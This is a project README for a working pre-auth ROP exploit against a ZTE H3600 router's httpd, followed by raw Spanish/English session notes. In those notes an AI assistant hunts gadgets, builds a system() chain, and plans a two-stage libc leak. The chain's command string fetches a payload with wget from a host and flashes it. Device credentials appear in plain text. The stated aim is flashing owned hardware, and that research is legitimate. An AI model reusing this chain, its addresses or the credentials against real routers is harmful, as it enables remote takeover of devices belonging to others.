# rop-no-uart — ROP exploit on stock httpd for pre-auth RCE (no UART required)

**ID**: 00.05.01
**Parent**: [00.05 firmware-load](../00.05.firmware-load/)
**Children**: none
**TaskList items**: none (working exploit; not actively maintained)
**Status**: ✅ WORKING — verified RCE against stock H3600 httpd 2026-05.

## TL;DR

Stock httpd's `rsaDecryptWithoutKeyFile` (typo `rasDecryptWithoutKeyFile`
in the binary) at `0x4d6e0` has a 512-byte stack buffer plus an unbounded
`decode_base64(dst, src)` call → classic stack overflow → saved `pc` from
the function epilogue is attacker-controlled.

No stack canaries (`strings httpd | grep -c __stack_chk_fail` = 0),
no PIE. Trivial ROP. Target gadgets + the working chain are in
`pwn_h3600.sh`.

## When you'd use this

You have HTTP reachability to a factory H3600 (`https://192.168.1.1/`),
**no FTDI cable**, **no SSH yet**. Run the exploit → it flips telnetd on
→ you have a shell. From there you can rsync the rootfs, then transition
to whichever path you want (build the cable, install our stock-shell
rootfs, etc.).

## Files

| File | What |
|---|---|
| `pwn_h3600.sh` | Main exploit — Python payload generator + curl HTTP delivery + SSH-verification of success. Args: `IP HTTP_PWD SSH_USER SSH_PASS` |
| `exploit_telnetd.sh` | Variant that specifically toggles `telnetd` ON |
| `exploit_telnetd_mod.sh` | Modified version (tweaked target binary version) |
| `rsa_bug_test.sh` | Diagnostic — proves the vuln exists without committing to full RCE |
| `README_exploit_rsaDecrypto.....txt` | 106 KB of additional RE notes |

## Ghidra project

The Ghidra project that produced the ROP gadgets lives **right here in
this task folder**: open `./ghidra/GHydra_ROP.gpr` in Ghidra to inspect
or extend the analysis (gadget hunting, type recovery, etc.).

It's task-local, not global — only this exploit uses it. Other Ghidra
projects (vmlinux, ko modules, U-Boot) that ARE used across multiple
tasks live at `zxic/ghidra/project_*/`.

The hard-coded addresses in `pwn_h3600.sh` (`SYSTEM_PLT = 0x0001a18c`,
`POP_R3_R4_FP_PC = 0x0001d150`, `MOV_R0_R4_BLX_R3 = 0x000545c8`) all
come from this project. They won't change unless ZTE ships a new httpd
binary — at which point you'd re-import the binary into the project
and re-hunt the gadgets.

## Legitimacy / disclosure

We own the hardware. ZTE/Digi declined to provide GPL source per request
(see memory `gpl_legitimacy_context`). Public exploit disclosure may be
appropriate at some point but is **out of scope for this task** — the
task here is just "be able to bootstrap a fresh unit without UART."

## See also

- [Parent: 00.05 firmware-load](../00.05.firmware-load/) — methods comparison + decision tree
- `docs/EXTERNAL_RESEARCH.md` — XYUU's kanxue thread mentions the same vuln family
- Memory `digi_h3600_universal_creds` — non-exploit access path (`admin / Haikui_V2`)

---

## Raw RE notes (preserved verbatim from the working session)

The below is unedited working-session output — mixing Spanish/English,
disassembly snippets, decision rationale, and exploitation math. It's
**reference, not documentation**. Look here when you need to understand
WHY a specific gadget or offset was chosen.

---

osea le puede el user hacer un overflow en rsaDecryptWithoutKeyFile tiene buffer de 512 bytes en stack + decode_base64(stack_buf, user_input) SIN length check.

  rasDecryptWithoutKeyFile @ 0x4d6e0 (nota: typo "ras" no "rsa"):
                                                                                                                                                                                              
  4d6e0: push  {r4,r5,r6,r7,r8,fp,lr}      ; salva lr en stack
  4d6e8: mov   r6, r0                       ; r6 = input usuario (base64)
  4d6ec: sub   sp, sp, #532                 ; reserva ~532 bytes stack
  4d6f4: sub   r0, fp, #540                 ; r0 = &stack_buf
  4d6fc: mov   r2, #512                     ; tamaño previsto = 512
  4d700: bl    memset                       ; memset(stack_buf, 0, 512)
  ...
  4d73c: bl    strlen                       ; sólo verifica strlen != 0
  ...
  4d7e4: mov   r1, r6                       ; r1 = input usuario
  4d7e8: sub   r0, fp, #540                 ; r0 = stack_buf (512 B)
  4d7ec: bl    decode_base64                ; <-- SOLO 2 ARGS, sin max_len
  ...
  4d870: pop   {r4,r5,r6,r7,r8,fp,pc}       ; restaura pc desde stack
                                                                                                                                                                                              
  Confirmado:
  - Buffer de 512 bytes en stack ✓
  - decode_base64(dst, src) — sólo 2 argumentos, sin parámetro de tamaño destino ✓
  - Caller: webPrivateDecrypt @ 0x4daa0 (entrada vía HTTP) ✓
  - Epílogo hace pop {..., pc} → overflow del saved lr da control directo del pc ✓
                                                                                                                                                                                              
  Math del exploit: base64 expande 4→3, así que un input de ~684 chars decodifica a 513 bytes y ya empieza a corromper. ~720+ chars sobrescriben el saved lr/pc.
                                                                                                                                                                                              
  ¿Estás desprotegido? Depende de tres cosas que el disassembly no te responde solo:
                                                                                                                                                                                              
  1. ¿webPrivateDecrypt es alcanzable pre-auth? Hay que mirar el dispatcher HTTP — si la ruta que la invoca está antes de validar sesión, es RCE pre-auth remoto. Si es post-login, sigue
  siendo escalada/persistencia post-auth.
  2. Mitigaciones del binario: ¿tiene stack canaries (__stack_chk_fail), NX, PIE/ASLR? Sin canary la explotación es trivial.
  3. Exposición de red: ¿el httpd escucha sólo en LAN o también en WAN? En H3600 normalmente LAN, pero hay que verificar.
                                                                                                                                                                                              




ubuntu@pc-work:~/Projects/MYSELF/ZTE$   F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd
ubuntu@pc-work:~/Projects/MYSELF/ZTE$ readelf -h $F | grep "Type:" 
  Type:                              EXEC (Executable file)
ubuntu@pc-work:~/Projects/MYSELF/ZTE$ readelf -l $F | grep -E "GNU_STACK|GNU_RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
ubuntu@pc-work:~/Projects/MYSELF/ZTE$ strings $F | grep -c "__stack_chk_fail"
0
ubuntu@pc-work:~/Projects/MYSELF/ZTE$ file /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/lib/libc.so.0
/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/lib/libc.so.0: symbolic link to libuClibc-0.9.33.2.so




  Si EXEC + no canary + ASLR off → ROP es paseo. ARM Cortex-A9, ARMv7 little-endian (gadgets en ARM y Thumb).
                                                                                                                                                                                                                      
  Opciones de ROP para flashear
                                                         
  Opción A — ROP-to-system() (el clásico, mínima cadena)
  
  - Cadena: gadget pop {r0, pc} → ptr a "sh -c 'wget http://192.168.1.50/openwrt.bin -O /var/tmp/fw.bin && /var/fw_flashing -d 1 -r 1 -p /var/tmp -f fw.bin'" → system@plt.
  - ~3 gadgets. La string podés meterla en un POST body, en un header, o en /proc/self/cmdline.
  - Pro: trivial, una shot, sin tocar el upload pipeline. Sirve si bug te da pc directo.
  - Contra: el wget necesita conectividad LAN al attacker; la víctima ya está en LAN nuestra para empezar (porque atacamos el web admin).
                                                                                                                                                                                                                      
  Opción B — ROP a callUploadDownloadProc directo (bypass del role check)
                                                                                                                                                                                                                      
  - El subagent dijo que el role check vive 100% en Lua, no en C. Si saltás el dispatcher Lua y entrás directo a funcs_callUploadDownloadProc (en httpd!0x4fbb8), no hay check de rol.
  - Cadena: prepará args como si vinieran del Lua VM → pop {r0, r1, r2, pc} → funcs_callUploadDownloadProc. Pero los args son punteros a estructuras de Lua (lua_State*), no datos crudos — necesitás
  ROP-to-lua_pushstring primero o reusar un lua_State* vivo en heap. Más complicado.
  - Pro: limpio, usa el upload path legítimo, llega a fw_flashing sin shell.
  - Contra: stack pivot a heap probablemente necesario, y los args de Lua son estructurados.
                                                                                                                                                                                                                      
  Opción C — ROP a my_upload_file directo (más bajo, sin Lua)
                                                                                                                                                                                                                      
  - my_upload_file @ httpd!0x4c9a4 parsea multipart y stream a path del entry. Si controlás los args (file_path, content), escribís donde quieras: /var/tmp/fw.bin, /usercfg/db_user_cfg.xml, /etc/passwd, etc.
  - Cadena: pop r0=path, r1=content, r2=len, pc → my_upload_file. O sea ESCRITURA ARBITRARIA a disco.
  - Pro: la primitiva más versátil. Escribir /usercfg/db_user_cfg.xml con admin pwd custom + reset → entrar como admin → flashear normal. O escribir directo /dev/mtd6 (slot A NAND) si el cspd tiene fd abierto.
  - Contra: necesitás conocer signatura exacta de my_upload_file.
                                                                                                                                                                                                                      
  Opción D — ROP a fw_flashing via execve
                                                                                                                                                                                                                      
  - execve("/var/fw_flashing", ["/var/fw_flashing", "-d", "1", "-r", "1", "-p", "/var/tmp", "-f", "fw.bin"], envp) directo.
  - Más limpio que Opción A (sin shell intermedio), pero necesitás 7 args alineados → cadena más larga.
                                                                                                                                                                                                                      
  Mi recomendación táctica
                                                                                                                                                                                                                      
  Combo: A para el primer round (proof-of-concept), C para distribución.
  
  - A te demuestra que el bug es weaponizable rápido: 1 POST → 1 ROP chain → wget + flash. 30 min de trabajo.
  - C es el módulo final que distribuís a usuarios: el script Python local hace HTTP request al modem con multipart conteniendo openwrt.bin cifrado-AES-bug → ROP escribe a /var/tmp/openwrt.bin → segunda ROP chain
  invoca fw_flashing. Cero conectividad externa requerida, cero shell, cero flashing tools del usuario.


Estamos yenbdo por option A

❯ Encontre un bug aca, rasDecryptWithoutKeyFile @ 0x4d6e0 no necesito que hagas el disassembly                                                                                                                        
                                                                                                                                                                                                                      
  Pensaba hacer                                                                                                                                                                                                       
                                                                                                                                                                                                                      
    - Cadena: gadget pop {r0, pc} → ptr a "sh -c 'wget http://192.168.1.50/openwrt.bin -O /var/tmp/fw.bin && /var/fw_flashing -d 1 -r 1 -p /var/tmp -f fw.bin'" → system@plt.                                         
                                                                                                                                                                                                                      
    - ~3 gadgets. La string podés meterla en un POST body, en un header, o en /proc/self/cmdline                                                                                                                      
                                                                                                                                                                                                                      
  el POC que hace el hang del httpd ya esta probado, recuerda que esto es para subir el firmware del modem GPL si GPL y no me dieron el codigo source                                                                 
                                                                                                                                                                                                                      
  Podemos buscar aca                                                                                                                                                                                                  
       === ARM gadgets in httpd .text ===                                                                                                                                                                             
       --- pop {r0,pc} (e8bd 8001) and pop {r0-r3,pc} variants ---  
       
*************************       
       
                                                                                                                                                                                                                      
● system@plt = 0x1a18c confirmado. pop {r0, pc} no existe en .text — buscaremos cadena indirecta vía r4. Hago búsqueda más amplia:
                                                                                                                                                                                                                      
● Bash(F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd                      
      # Try ROPgadget…)                                                                                                                                                                                               
  ⎿  pop {r0, pc}                                      :  0 hits →                                                                                                                                                    
     pop {r0-r2, pc}                                   :  0 hits →                                                                                                                                                    
     pop {r4, pc}                                      :  1 hits → 0x1bcac                                                                                                                                            
     … +19 lines (ctrl+o to expand)                                                                                                                                                                                   
  ⎿  Allowed by auto mode classifier                     
                                                                                                                                                                                                                      
● mov r0, sp × 5 — vector excelente. Si alguno tiene bl system@plt cerca, ROP de 1 sola gadget. Inspecciono:
                                                                                                                                                                                                                      
● Bash(F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd
      # Show 8 instructions (32 bytes) at each "mov r0, sp" hit…)                                                                                                                                                     
  ⎿  === @ 0x41cac ===
                                                                                                                                                                                                                      
     /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd:     file format elf32-littlearm
     … +76 lines (ctrl+o to expand)                                                                                                                                                                                   
  ⎿  Allowed by auto mode classifier                     
                                                                                                                                                                                                                      
● Bash(F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd
      echo === PIE/ASLR check ===…)                                                                                                                                                                                   
  ⎿  === PIE/ASLR check ===                              
     /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped                               
       Type:                              EXEC (Executable file)                      
     … +11 lines (ctrl+o to expand)                                                                                                                                                                                   
  ⎿  Allowed by auto mode classifier                                                                                                                                                                                  
                                                                                                                                                                                                                      
● Bash(F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd                                                                                                                                                      
      arm-linux-gnueabi-objdump -d $F 2>/dev/null > /tmp/httpd.s…)                                                                                                                                                    
  ⎿  === ALL bl system@plt sites in httpd ===            
        4b904:  e59f0030        ldr     r0, [pc, #48]   @ 4b93c <webSetPath+0x8c>                                                                                                                                     
        4b908:  ebff3a1f        bl      1a18c <system@plt>
     … +14 lines (ctrl+o to expand)                                                                                                                                                                                   
  ⎿  Allowed by auto mode classifier                     
                                                                                                                                                                                                                      
● 🎯 libc tiene 2× pop {r0, pc} + system + 79× mov r0, sp. ROP viable si conocemos libc base.

                                                                                                                                                                                                                      
● Bash(F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd
      # Read the literal pool entry that the existing system() call uses…)                                                                                                                                            
  ⎿  === httpd's hardcoded system() command (at 0x4b934) ===
                                                                                                                                                                                                                      
     /home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd:     file format elf32-littlearm
     … +47 lines (ctrl+o to expand)                                                                                                                                                                                   
  ⎿  Allowed by auto mode classifier                     
                                                                                                                                                                                                                      
● Bash(F=/home/ubuntu/Projects/MYSELF/ZTE/H3600/rootfs/bin/httpd
      echo "=== Thumb gadgets in httpd .text (16-bit instructions, 2-byte aligned) ==="…)                                                                                                                             
  ⎿  === Thumb gadgets in httpd .text (16-bit instructions, 2-byte aligned) ===
     Thumb mov r0, sp                   : 1 → 0xc8f58                                                                                                                                                                 
     Thumb bx r4                        : 2 → 0x87c88 0xa85bc
     
     
     
❯ Habiamos encontrado esto y la coneccion se corto. Recuerda que estabamos par hacer un upload del firmware que es GPL GPL y no nos dieron el source code                                                             
                                                                                                                                                                                                                      
● Sí, retomamos. Estado del exploit (todo verificable contra el binario extraído):                                                                                                                                    
                                                                                           
  Recap del catálogo
                                                                                                                                                                                                                      
  httpd (no-PIE, base fija):                                                               
  - system@plt = 0x1a18c                                                                                                                                                                                              
  - Único bl system@plt directo en 0x4b908 con string hardcodeada "rm -rf /var/lua_tmp/" → inútil para nosotros                                                                                                       
  - Gadgets pobres: pop {r4, pc} ×1 @ 0x1bcac, pop {r4-r6, pc} ×8, mov r0, sp ×5 (todos seguidos de bl memcpy@plt, no system)                                                                                         
  - Thumb: mov r0, sp ×1 @ 0xc8f58                                                                                                                                                                                    
                                                                                                                                                                                                                      
  libc (libuClibc-0.9.33.2.so, gadgets ricos):                                                                                                                                                                        
  - system = libc+0x522b4                                                                                                                                                                                             
  - pop {r0, pc} ×2 = libc+0x32570, libc+0x52ddc                                                                                                                                                                      
  - pop {r4, pc} ×131                                                                                                                                                                                                 
  - mov r0, sp ×79                                                                                                                                                                                                    
                                                       
  Lo único que falta: libc base en runtime                                                                                                                                                                            
                                                                                                                                                                                                                      
  httpd es no-PIE → su system@plt y gadgets están en addresses fijas siempre. Pero libc se mmap-ea — su base depende de ASLR.                                                                                         
                                                                                                                                                                                                                      
  El check definitivo lo podemos hacer YA con SSH (tenés admin/UkuGPeyRDU en tu device):                                                                                                                              
                                                               
  ssh admin@192.168.1.1 "cat /proc/\$(pidof httpd)/maps | grep -E 'libc|httpd'"                                                                                                                                       
                                                                                                                                                                                                                      
  Si randomize_va_space=0 (típico embedded) → libc base es FIJA → el chain funciona universalmente para todos los H3600. Si está randomizada → chain de 2 etapas (leak vía GOT, luego ROP).                           
                                                                                                                                                                                                                      
  Chain template (asumiendo libc base = LIBC)                                                                                                                                                                         
                                      
  [overflow padding]
  [saved_lr ← LIBC + 0x32570]   ; pop {r0, pc}                                                                                                                                                                        
  [r0 ← addr_of_cmd_string]      ; ptr a nuestra string                                                                                                                                                               
  [pc ← LIBC + 0x522b4]          ; system()                                                                                                                                                                           
  [cmd_string: "wget http://192.168.1.50/openwrt.bin -O /var/tmp/fw.bin && /var/fw_flashing -d 1 -r 1 -p /var/tmp -f fw.bin\x00"]                                                                                     
                                                                                                                                                                                                                      
  La cmd_string podés meterla en el mismo POST body después del chain — su address es predecible (stack offset desde el overflow trigger).                                                                            
                                                                                                                                                                                                                      
  Si me corrés ese cat /proc/.../maps te armo el chain final con offsets concretos. ¿Lanzo el SSH yo?                                                                                                                 
     
❯ me explicas esto?                                                                                                                                                                                                   
  que seria el PIE y como podemos ejecutar gagets de libuc se porque la libreria esta compilada estatica o se ejecuta dentro del mismo proceso cuando se linkea? ?                                                    
                                                                                                                                                                                                                      
● Buenas preguntas, fundamentales:                                                                                                                                                                                    
                                                                                                                                                                                                                    
  PIE (Position Independent Executable)                                                                                                                                                                               
                                                                                                                                                                                                                      
  Es un flag del compilador/linker. Determina si el código del binario puede ejecutarse desde cualquier dirección virtual o desde una fija compilada al binario.                                                      
                                                                                                                                                                                                                      
  - Sin PIE (ELF tipo EXEC): el binario fija sus addresses al compilar — cuando se carga, va siempre a la misma virtual address (ej. 0x10000). Código + GOT + PLT en addresses conocidas y constantes. Sin ASLR       
  posible para ese binario.                                                                                                                                                                                           
  - Con PIE (ELF tipo DYN): el binario es como un .so — se mappea en mmap, base aleatoria si ASLR activo. Cada arranque, addresses cambian.                                                                           
                                                                                                                                                                                                                      
  Nuestro httpd es no-PIE (Type: EXEC, Entry point: 0x1bbd0), o sea sus gadgets viven SIEMPRE en 0x1bcac, 0x4b908, etc. Mismas addresses cada reboot, mismas addresses entre devices con mismo firmware.              
                                                                                                                                                                                                                      
  ¿Cómo se ejecuta código de libuClibc dentro de httpd?                                                                                                                                                               
                                                         
  libc.so.0 (símlink a libuClibc-0.9.33.2.so) es una librería compartida dinámica — un archivo .so separado. NO está embebida en httpd. La secuencia es:                                                              
                                                         
  1. Kernel ejecuta httpd → ve en su header INTERP /lib/ld-uClibc.so.0 → invoca el dynamic loader (ld) primero.                                                                                                       
  2. ld parsea las dependencias de httpd (DT_NEEDED libc.so.0).
  3. ld hace mmap(libc.so.0, ...) → mapea el código de libc DENTRO del mismo address space del proceso httpd, en alguna región alta.                                                                                  
  4. ld resuelve los símbolos: la GOT/PLT de httpd queda apuntando a las funciones libc en sus nuevas addresses runtime.                                                                                              
  5. Control pasa a httpd::_start.                                                                                                                                                                                    
                                                                                                                                                                                                                      
  Resultado: el proceso httpd tiene en su memoria virtual:                                                                                                                                                            
  0x00010000-0x000ee... → httpd .text/.data/etc (fijo, no-PIE)                                                                                                                                                        
  0x4xxxxxx0-0x4xxxxxxx → libc.so .text/.data    (mmap'd, base depende de ASLR)                                                                                                                                       
  0x4xxxxxxx-0x4xxxxxxx → libpthread.so          (idem)                                                                                                                                                               
  0xbexxx...-0xbfffffff → stack                                                                                                                                                                                       
                                                                                                                                                                                                                      
  Para ROP: cuando hacemos overflow y reescribimos pc (el program counter), el CPU SOLO ejecuta lo que está en su address space. Los gadgets de libc viven a LIBC_BASE + 0x32570, etc. — sólo necesitamos saber       
  LIBC_BASE para construir las addresses absolutas.                                                                                                                                                                   
                                                                                                                                                                                                                      
  Statically linked sería distinto                                                                                                                                                                                    
                                                         
  Si httpd estuviera statically linked, todo el código de libc estaría EMBEBIDO dentro del binario httpd mismo. No habría libc.so.0 separado. Las addresses serían fijas (parte del binario no-PIE) y no dependerían  
  de ASLR.                                               
                                                                                                                                                                                                                      
  Verificable:                                           
  file /home/.../httpd
  # nuestro caso → "dynamically linked, interpreter /lib/ld-uClibc.so.0"
                                                                        
  Si fuera estático diría "statically linked".                                                                                                                                                                        
                                                                                                                                                                                                                      
  ASLR en libc — el unknown actual                                                                                                                                                                                    
                                                                                                                                                                                                                      
  En Linux, mmap() puede randomizar la base de bibliotecas según /proc/sys/kernel/randomize_va_space:                                                                                                                 
  - 0 → ASLR off, todas las libs cargan en addresses determinísticas (siempre la misma cada reboot)
  - 1 → ASLR mmap (libs aleatorias) pero stack/heap fijos                                                                                                                                                             
  - 2 → ASLR completa (default Linux moderno)            
                                                                                                                                                                                                                      
  En embedded routers suele estar en 0 o 1 por simplicidad/perf. Si 0 → nuestro chain funciona cross-device. Si 2 → necesitamos primero un info-leak (leer la GOT de httpd vía otro bug → eso da una addr de función
  libc → restamos su offset → libc base).                                                                                                                                                                             
                                                         
  El test es trivial vía SSH:                                                                                                                                                                                         
  cat /proc/sys/kernel/randomize_va_space                
  cat /proc/$(pidof httpd)/maps | grep libc
  
  ❯ .. / # cat /proc/1015/maps | grep libc                                                                                                                                                                              
  b69e6000-b6a7c000 r-xp 00000000 1f:08 1846       /lib/libuClibc-0.9.33.2.so                                                                                                                                         
  b6a83000-b6a84000 r--p 00095000 1f:08 1846       /lib/libuClibc-0.9.33.2.so                                                                                                                                         
  b6a84000-b6a85000 rw-p 00096000 1f:08 1846       /lib/libuClibc-0.9.33.2.so                                                                                                                                         
  b6a8a000-b6a8b000 r-xp 00000000 1f:08 1808       /lib/libcsputil.so                                                                                                                                                 
  b6a92000-b6a93000 rw-p 00000000 1f:08 1808       /lib/libcsputil.so                                                                                                                                                 
  b6ad9000-b6ae7000 r-xp 00000000 1f:08 1801       /lib/libcmexpat.so                                                                                                                                                 
  b6aef000-b6af0000 rw-p 0000e000 1f:08 1801       /lib/libcmexpat.so                                                                                                                                                 
  b6af9000-b6c1d000 r-xp 00000000 1f:08 1807       /lib/libcrypto.so.1.0.0                                                                                                                                            
  b6c24000-b6c34000 rw-p 00123000 1f:08 1807       /lib/libcrypto.so.1.0.0                                                                                                                                            
  b6c9f000-b6ca0000 r-xp 00000000 1f:08 1798       /lib/libcapability.so                                                                                                                                              
  b6ca7000-b6ca8000 rw-p 00000000 1f:08 1798       /lib/libcapability.so                                                                                                                                              
  b6ca8000-b6cf9000 r-xp 00000000 1f:08 1799       /lib/libcfapi.so                                                                                                                                                   
  b6d00000-b6d03000 rw-p 00050000 1f:08 1799       /lib/libcfapi.so                                                                                                                                                   
  b6d0d000-b6d2a000 r-xp 00000000 1f:08 1809       /lib/libctype.so                                                                                                                                                   
  b6d31000-b6d32000 rw-p 0001c000 1f:08 1809       /lib/libctype.so                                                                                                                                                   
  b6d32000-b6ea5000 r-xp 00000000 1f:08 1800       /lib/libcmapi.so                                                                                                                                                   
  b6ead000-b6eb6000 rw-p 00173000 1f:08 1800       /lib/libcmapi.so                                                                                                                                                   
  b6f65000-b6f7e000 r-xp 00000000 1f:08 1802       /lib/libcommfun.so                                                                                                                                                 
  b6f86000-b6f87000 rw-p 00019000 1f:08 1802       /lib/libcommfun.so                                                                                                                                                 
  b6f97000-b6f9d000 r-xp 00000000 1f:08 1789       /lib/ld-uClibc-0.9.33.2.so                                                                                                                                         
  b6fa4000-b6fa5000 r--p 00005000 1f:08 1789       /lib/ld-uClibc-0.9.33.2.so                                                                                                                                         
  b6fa5000-b6fa6000 rw-p 00006000 1f:08 1789       /lib/ld-uClibc-0.9.33.2.so                                                                                                                                         
                                                                                                                                                                                                                      
  / #   cat /proc/sys/kernel/randomize_va_space                                                                                                                                                                       
  1                                                                                                                                                                                                                   
                                                                                                                                                                                                                      
  entiendo que el primero te dice donde estan las direcciones de las librerias dinamicas verdad? y esas son siempre las mismas? y que es el otro comando que da 1?                                                    
                                                                                                                                                                                                                      
  otra pregunta                                                                                                                                                                                                       
    - Sin PIE (ELF tipo EXEC): el binario fija sus addresses al compilar — cuando se carga, va siempre a la misma virtual address (ej. 0x10000). Código + GOT + PLT en addresses conocidas y constantes. Sin ASLR     
                                                                                                                                                                                                                      
    posible para ese binario.                                                                                                                                                                                         
                                                                                                                                                                                                                      
                                                                                                                                                                                                                      
  esto del PIE como sabes que direccion se tiene que ejecutar? es dificil eos no?                                                                                                                                     

● Sí, exacto. Te respondo las tres:                
                                                                                                                
  1. /proc/PID/maps — el mapa de memoria de ESE proceso                                                                                                                                                               
                                                                                                                                                                                                                      
  Sí, te muestra exactamente qué tiene mappeado el proceso PID 1015 (httpd) en su address space ahora. La columna izquierda es el rango virtual, después permisos (r-xp = read+execute, código), después              
  offset+inode+nombre.                                                                                                                                                                                                
                                                                                                                                                                                                                      
  b69e6000-b6a7c000 r-xp ... libuClibc-0.9.33.2.so       
  Significa: el código de libc (.text ejecutable) vive entre 0xb69e6000 y 0xb6a7c000 para ESTE proceso, AHORA.                                                                                                        
                                                                                                                                                                                                                      
  2. randomize_va_space=1 — ASLR parcial                                                                                                                                                                              
                                                                                                                                                                                                                      
  El kernel tiene 3 niveles:                                                                                                                                                                                          
   
  ┌───────┬─────────────────────────────────────────────────────────────────────┐                                                                                                                                     
  │ valor │                            qué randomiza                            │
  ├───────┼─────────────────────────────────────────────────────────────────────┤                                                                                                                                     
  │ 0     │ Nada — todo determinístico                                          │
  ├───────┼─────────────────────────────────────────────────────────────────────┤                                                                                                                                     
  │ 1     │ mmap (libs), stack, vDSO. Heap NO. Executable text NO si es no-PIE. │
  ├───────┼─────────────────────────────────────────────────────────────────────┤                                                                                                                                     
  │ 2     │ Default Linux moderno: lo de 1 + heap (brk)                         │
  └───────┴─────────────────────────────────────────────────────────────────────┘                                                                                                                                     
                                                         
  Tu device tiene 1 → libc base CAMBIA en cada reboot del device (en cada exec de httpd, en realidad). El 0xb69e6000 que ves hoy, mañana puede ser 0xb6a32000 u otro.                                                 
                                                         
  Consecuencia práctica para nuestro ROP:                                                                                                                                                                             
  - Las addresses de httpd (no-PIE EXEC) son fijas: system@plt = 0x1a18c, pop {r4, pc} = 0x1bcac, etc. ✅ no cambian nunca.
  - Las addresses de libc (gadgets pop {r0,pc}, system) son runtime-dependent. ❌ no podemos hardcodear.                                                                                                              
                                                                                                        
  → Necesitamos un info-leak primero: un bug (puede ser el mismo rasDecryptWithoutKeyFile o uno chico aparte) que nos devuelva un puntero a alguna función libc — típicamente leyendo la GOT de httpd. Restando el    
  offset conocido de esa función dentro de libc, derivamos el base.                                                                                                                                                   
                                                                                                                                                                                                                      
  Sin ASLR completo (no es 2), la cosa es factible aunque suma una etapa.                                                                                                                                             
                                                         
  3. ¿Cómo sabe dónde cargar el binario no-PIE?                                                                                                                                                                       
                                                         
  Buena pregunta — al revés, es trivial para el kernel.                                                                                                                                                               
                                                         
  Cuando compilás un ELF no-PIE, el linker FIJA todas las addresses al link time. Mirá el ELF header de httpd:                                                                                                        
                                                         
  Type: EXEC                                                                                                                                                                                                          
  Entry point: 0x1bbd0                                   

  Y los program headers (con readelf -l httpd) dicen algo como:                                                                                                                                                       
  LOAD off 0x000000 vaddr 0x00010000 paddr 0x00010000 size 0xe0fb4 ... R E
  LOAD off 0x0d8000 vaddr 0x000f8000 paddr 0x000f8000 size 0x16000 ... RW                                                                                                                                             
                                                                                                                                                                                                                      
  Cada segmento dice "yo tengo que vivir EN esta virtual address específica". El kernel literalmente hace mmap(addr=0x10000, ..., MAP_FIXED) — le dice a la MMU "carga acá, no en otro lado". Si esa región está libre
   (lo está, porque ningún otro código en el espacio nuevo del proceso ha sido mappeado todavía), funciona.                                                                                                           
                                                                                                                                                                                                                      
  Es decir: no es difícil, está pre-determinado en el binario. La dificultad estaría si dos binarios pidieran el mismo address — pero como cada proceso tiene su propio address space virtual, no hay colisión entre  
  procesos.                                              
                                                                                                                                                                                                                      
  PIE es la opción "moderna" justamente porque permite ASLR del binario propio. PIE compila todo el código como PC-relative (cada instrucción computa addresses sumando offsets desde el program counter, no desde una
   base absoluta) → el kernel/loader puede meterlo donde quiera.
                                                                                                                                                                                                                      
  Próximo paso para nuestro caso                                                                                                                                                                                      
   
  Dado randomize_va_space=1:                                                                                                                                                                                          
                                                         
  1. Sí podemos hacer ROP, pero requiere 2 etapas:                                                                                                                                                                    
    - Etapa 1 (leak): explotar rasDecryptWithoutKeyFile o usar otro lado para LEER httpd.got[<libc_func>] → obtenemos una libc address concreta → derivamos libc_base.
    - Etapa 2 (RCE): enviamos un nuevo overflow con el chain pop {r0,pc}; cmd_str; system calculado con el libc_base recién derivado.                                                                                 
  2. Importante: ambas etapas deben usar el MISMO proceso httpd (mismo PID 1015) — si entre etapas httpd crashea/respawnea, libc base se re-randomiza y el leak queda inválido.                                       
                                                                                                                                                                                                                      
  ¿Lanzo el script de leak-stage que extrae httpd.got y deriva libc_base, o querés explicación del bug rasDecryptWithoutKeyFile antes?                                                                                
                                                                                                                                                                                                                      
✻ Sautéed for 57s                                                                                                                                                                                                     

● Acá está completo. Mirá lo que necesitamos:                                                                                                                                                                         
                                                                                                                                                                                                                      
  Tabla maestra (todo fijo, base estática)                                                                                                                                                                            
                                                         
  httpd GOT slots (no-PIE, addresses constantes):                                                                                                                                                                     
    0x12374c → puntero a libc::memcpy   ← target ideal de leak
    0x12319c → puntero a libc::printf                                                                                                                                                                                 
    0x123c18 → puntero a libc::strcpy                    
    0x123c84 → puntero a libc::system                                                                                                                                                                                 
                                                         
  libc offsets internos (estáticos en el .so):                                                                                                                                                                        
    memcpy  = 0x32940                                    
    printf  = 0x2a164                                                                                                                                                                                                 
    strcpy  = 0x32fbc                                    
    system  = 0x522b4                                                                                                                                                                                                 
    pop {r0,pc} gadget #1 = 0x32570
    pop {r0,pc} gadget #2 = 0x52ddc                                                                                                                                                                                   
                                                         
  Algoritmo de la etapa 1 (leak)                                                                                                                                                                                      
                                                         
  1. Tu bug (rasDecryptWithoutKeyFile) tiene que leerte 4 bytes desde 0x12374c                                                                                                                                        
  2. Esos 4 bytes son la runtime address de memcpy (ej. 0xb6a18940)                                                                                                                                                   
  3. libc_base = 0xb6a18940 - 0x32940 = 0xb69e6000                                                                                                                                                                    
                                                                                                                                                                                                                      
  Verificación con tu device en este momento:                                                                                                                                                                         
  - libc base reportado por /proc/maps = 0xb69e6000                                                                                                                                                                   
  - 0xb69e6000 + 0x32940 (memcpy offset) = 0xb6a18940                                                                                                                                                                 
  - Si pudiéramos leer ahora 0x12374c del proceso 1015, devolvería 0xb6a18940 ✅
                                                                                                                                                                                                                      
  Etapa 2 (chain con base derivada)                                                                                                                                                                                   
                                                                                                                                                                                                                      
  libc_base = leaked_memcpy - 0x32940   # ← derivado en runtime                                                                                                                                                       
  pop_r0_pc = libc_base + 0x32570                                                                                                                                                                                     
  system    = libc_base + 0x522b4                                                                                                                                                                                     
                                                                                                                                                                                                                      
